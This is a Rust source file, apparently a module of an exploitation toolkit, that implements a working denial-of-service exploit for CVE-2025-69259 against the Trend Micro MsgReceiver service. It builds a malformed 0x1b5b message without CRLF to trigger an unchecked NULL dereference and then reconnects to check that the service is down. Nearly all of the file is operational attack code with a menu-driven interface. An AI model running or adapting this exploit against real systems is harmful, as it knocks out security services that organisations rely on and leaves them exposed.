use anyhow::{Context, Result};
use colored::*;
use tokio::net::TcpStream;
use byteorder::{BigEndian, LittleEndian, WriteBytesExt};
use crate::utils::{prompt_default, prompt_required, prompt_port, prompt_yes_no, normalize_target};

const DEFAULT_PORT: u16 = 20001;

pub async fn run(target: &str) -> Result<()> {
    println!("{}", "╔═══════════════════════════════════════════════════════════╗".cyan());
    println!("{}", "║    Trend Micro MsgReceiver DoS (CVE-2025-69259)           ║".cyan());
    println!("{}", "║    Unchecked NULL Return Value - Service Crash            ║".cyan());
    println!("{}", "╚═══════════════════════════════════════════════════════════╝".cyan());

    // Parse target
    let target_host = if target.is_empty() {
        prompt_required("Target IP/Hostname")?
    } else {
        normalize_target(target)?
    };
    
    let target_host = target_host
        .trim_start_matches("http://")
        .trim_start_matches("https://")
        .split(':')
        .next()
        .unwrap_or(&target_host)
        .to_string();
    
    let port = prompt_port("Port", DEFAULT_PORT)?;

    println!("[*] Target: {}:{}", target_host, port);
    println!("{}", "[!] WARNING: This exploit will CRASH the MsgReceiver service!".red().bold());

    loop {
        println!("\n{}", "Select mode:".cyan());
        println!("1. Attack (DoS - Crash Service)");
        println!("2. Exit");
        
        let choice = prompt_default("Select option", "2")?;

        match choice.as_str() {
            "1" => {
                if prompt_yes_no("This will crash the target service. Continue?", false)? {
                    exploit(&target_host, port).await?;
                }
            }
            "2" => break,
            _ => println!("{}", "Invalid choice".red()),
        }
    }

    Ok(())
}

async fn exploit(host: &str, port: u16) -> Result<()> {
    let addr = format!("{}:{}", host, port);
    println!("[*] Connecting to {}...", addr);
    
    let mut stream = TcpStream::connect(&addr).await
        .context("Failed to connect. Target might already be down.")?;

    // Vulnerability: Message 0x1b5b "new protocol" expects data with CRLF.
    // When strstr(data, "\r\n") returns NULL, it's not checked, causing crash.
    //
    // struct msg_1b5b_new_proto {
    //     hdr h;           // be32 MsgSize + byte unk[9]
    //     le16 MsgId;      // 0x1b5b
    //     byte zero[2];    // Two zero bytes = "new protocol" indicator
    //     le32 DataSize;
    //     byte data[DataSize]; // Data WITHOUT \r\n triggers the bug
    // };

    let msg_id: u16 = 0x1b5b;
    
    // Payload: Data that does NOT contain \r\n
    let payload_data = b"AAAAAAAAAAAAAAAA_NO_CRLF_HERE"; 
    let data_len = payload_data.len() as u32;

    // Body = MsgId (2) + Zero (2) + DataSize (4) + Data
    let body_size = 2 + 2 + 4 + data_len;
    let total_msg_size = 13 + body_size;

    let mut buffer = Vec::new();

    // Header
    buffer.write_u32::<BigEndian>(total_msg_size)?;
    buffer.extend_from_slice(&[0u8; 9]);

    // Body
    buffer.write_u16::<LittleEndian>(msg_id)?;
    buffer.extend_from_slice(&[0u8, 0u8]); // "New protocol" indicator
    buffer.write_u32::<LittleEndian>(data_len)?;
    buffer.extend_from_slice(payload_data);

    println!("[*] Sending malformed 0x1b5b message (missing CRLF)...");
    println!("[*] Payload size: {} bytes", buffer.len());
    
    if let Err(e) = tokio::io::AsyncWriteExt::write_all(&mut stream, &buffer).await {
        println!("{}", format!("[!] Connection closed during write: {}", e).yellow());
        println!("{}", "[+] This may indicate successful crash!".green());
    } else {
        println!("{}", "[+] Payload sent.".green());
    }

    // Verify crash by attempting reconnection
    println!("[*] Waiting 2 seconds then checking if target is down...");
    tokio::time::sleep(tokio::time::Duration::from_secs(2)).await;
    
    match TcpStream::connect(&addr).await {
        Ok(_) => {
            println!("{}", "[-] Target still responding - may need multiple attempts.".yellow());
        }
        Err(_) => {
            println!("{}", "[+] Target DOWN! Connection refused/timeout.".green().bold());
            println!("{}", "[+] MsgReceiver service has crashed.".green());
        }
    }

    Ok(())
}
